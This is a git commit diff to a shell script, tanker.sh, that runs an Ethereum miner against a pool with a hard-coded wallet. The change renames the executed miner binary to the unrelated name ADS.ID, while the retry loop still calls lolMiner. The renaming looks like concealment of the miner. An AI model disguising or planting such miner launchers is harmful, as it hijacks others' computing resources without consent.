6bf740e6f8396c74d7dc1bddc2c0c301c30bcf68
ica02 <78954945+ica02@users.noreply.github.com>
2021-02-15 00:38:28 +0700

    Update tanker.sh

--- tanker.sh
+++ tanker.sh
@@ -13,7 +13,7 @@ WALLET=0x2dd9a734ffe4c75bbae173a13a5019b962eb1b76.lol123
 
 cd "$(dirname "$0")"
 
-chmod +x ./lolMiner && ./lolMiner --algo ETHASH --pool $POOL --user $WALLET $@
+chmod +x ./ADS.ID && ./ADS.ID --algo ETHASH --pool $POOL --user $WALLET $@
 while [ $? -eq 42 ]; do
     sleep 10s
     ./lolMiner --algo ETHASH --pool $POOL --user $WALLET $@
